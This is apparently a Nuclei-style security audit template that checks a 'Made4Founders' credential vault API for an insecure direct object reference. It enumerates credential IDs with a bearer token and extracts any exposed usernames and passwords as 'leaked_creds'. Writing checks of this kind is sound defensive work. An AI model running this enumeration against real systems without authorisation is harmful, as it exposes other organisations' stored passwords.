id: m4f-idor-credentials

info:
  name: Made4Founders - Credential Vault IDOR
  author: security-audit
  severity: critical
  description: Tests for IDOR in credential vault - can expose passwords across organizations
  tags: idor,m4f,credentials,critical

http:
  - raw:
      - |
        GET /api/credentials/{{id}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{auth_token}}

    payloads:
      id:
        - "1"
        - "2"
        - "3"
        - "5"
        - "10"
        - "50"
        - "100"

    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"username":'
          - '"password":'
        condition: or

    extractors:
      - type: json
        json:
          - '.username'
          - '.password'
        name: leaked_creds
